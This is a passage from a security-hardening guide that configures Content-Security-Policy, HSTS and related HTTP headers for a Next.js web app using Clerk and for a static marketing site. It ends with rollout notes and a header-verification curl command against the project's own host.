  "frame-src 'self' https://challenges.cloudflare.com https://*.protect.clerk.com",
  "frame-ancestors 'none'",
  "form-action 'self'",
  "base-uri 'none'",
  "object-src 'none'",
  "manifest-src 'self'",
  isProd ? "upgrade-insecure-requests" : "",
]
  .filter(Boolean)
  .join("; ")

/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
  transpilePackages: ["@agora/ui", "@agora/db", "@agora/ai", "@agora/legal"],
  poweredByHeader: false,
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          // Start with Report-Only for one deploy, confirm zero violations, then rename
          // the key to "Content-Security-Policy".
          { key: "Content-Security-Policy", value: csp },
          {
            key: "Strict-Transport-Security",
            value: "max-age=63072000; includeSubDomains; preload",
          },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=(), payment=(), usb=(), interest-cohort=()",
          },
          // same-origin-allow-popups, not same-origin: Clerk and Stripe Checkout open
          // popups/redirects that must keep their opener reference.
          { key: "Cross-Origin-Opener-Policy", value: "same-origin-allow-popups" },
          { key: "Cross-Origin-Resource-Policy", value: "same-origin" },
          { key: "X-DNS-Prefetch-Control", value: "off" },
        ],
      },
      {
        // Auth and data endpoints must never be stored anywhere.
        source: "/api/:path*",
        headers: [{ key: "Cache-Control", value: "no-store, private" }],
      },
    ]
  },
}

module.exports = withPWA(nextConfig)
```

**Clerk built-in variant — requires upgrading `@clerk/nextjs` from 6.12.12 to ≥ 6.14.0.** Once
upgraded, delete the `csp` string above and let Clerk generate the Clerk-specific directives
(including a per-request nonce) in `apps/web/src/middleware.ts`, keeping everything else in
`headers()`:

```ts
// apps/web/src/middleware.ts — after `pnpm --filter @agora/web add @clerk/nextjs@^6.14.0`
import { clerkMiddleware, createRouteMatcher } from "@clerk/nextjs/server"

const isPublicRoute = createRouteMatcher([
  "/",
  "/sign-in(.*)",
  "/sign-up(.*)",
  "/api/health",
  "/api/webhooks(.*)",
  "/manifest.json",
])

export default clerkMiddleware(
  async (auth, req) => {
    if (!isPublicRoute(req)) await auth.protect()
  },
  {
    // Clerk emits its own FAPI/img/frame origins and a per-request nonce; `strict: true`
    // yields a strict-dynamic policy. Only app-specific extras go in `directives`.
    contentSecurityPolicy: {
      strict: true,
      directives: {
        "frame-ancestors": ["'none'"],
        "form-action": ["'self'"],
        "base-uri": ["'none'"],
        "object-src": ["'none'"],
        "worker-src": ["'self'", "blob:"], // next-pwa service worker
      },
    },
  },
)

export const config = {
  matcher: [
    "/((?!_next|[^?]*\\.(?:html?|css|js(?!on)|jpe?g|webp|png|gif|svg|ttf|woff2?|ico|csv|docx?|xlsx?|zip|webmanifest)).*)",
    "/(api|trpc)(.*)",
    "/__clerk/(.*)", // required by Clerk — do not omit
  ],
}
```

Caveat carried over from the Next.js docs: a nonce-based (`strict: true`) policy makes nonce-consuming
pages render dynamically. For `apps/web` that is free — every screen is already authenticated and
dynamic. For `apps/website` it is not, which is why the website below uses a static policy.

### B. `apps/website` — marketing site, zero third-party origins

```js
// apps/website/next.config.js
const isProd = process.env.NODE_ENV === "production"

// Every origin here is 'self'. Fonts are self-hosted via next/font, employer logos are
// downloaded at build time (scripts/fetch-live-data.mts), and there is no analytics.
// 'unsafe-inline' in script-src is a KNOWN GAP: it exists only for the two inline blocks
// in src/app/layout.tsx (motion flag + JSON-LD). Remove it after finding P3 #11 is fixed.
const csp = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline' ${isProd ? "" : "'unsafe-eval'"}`,
  "style-src 'self' 'unsafe-inline'", // Tailwind + framer-motion inline style attributes
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "connect-src 'self'", // only /api/waitlist
  "media-src 'self'",
  "frame-src 'none'",
  "frame-ancestors 'none'",
  "form-action 'self'",
  "base-uri 'none'",
  "object-src 'none'",
  isProd ? "upgrade-insecure-requests" : "",
]
  .filter(Boolean)
  .join("; ")

/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
  poweredByHeader: false,
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "Content-Security-Policy", value: csp },
          {
            key: "Strict-Transport-Security",
            value: "max-age=63072000; includeSubDomains; preload",
          },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=(), payment=(), usb=(), interest-cohort=()",
          },
          { key: "Cross-Origin-Opener-Policy", value: "same-origin" },
          { key: "Cross-Origin-Resource-Policy", value: "same-origin" },
          { key: "X-DNS-Prefetch-Control", value: "off" },
        ],
      },
      { source: "/api/:path*", headers: [{ key: "Cache-Control", value: "no-store" }] },
    ]
  },
}

module.exports = nextConfig
```

### Rollout notes

1. **`headers()` in `next.config.js`, not `vercel.json`.** `infrastructure/vercel.json` sets
   `rootDirectory: apps/web`, so a `headers` block there would apply to the web app only and would
   silently miss the marketing site if it is deployed as a second Vercel project. Keeping headers in
   each app's config keeps them with the code and testable locally.
2. **HSTS `preload`:** the directive is included, but do **not** submit the domain to
   hstspreload.org until every subdomain (including any Clerk satellite domain and the marketing
   site) is HTTPS-only — preload is effectively irreversible for months.
3. **Ship CSP as `Content-Security-Policy-Report-Only` for one deploy** on each app, walk the
   sign-in → swipe → review → submit flow and the marketing page with the console open, then flip
   the header name. The Clerk sign-in widget is the most likely thing to trip a directive.
4. **Verify:** `curl -sI https://<host>/dashboard | grep -iE 'content-security|strict-transport|x-frame|x-content-type|referrer|permissions|cross-origin'` — expect nine headers.
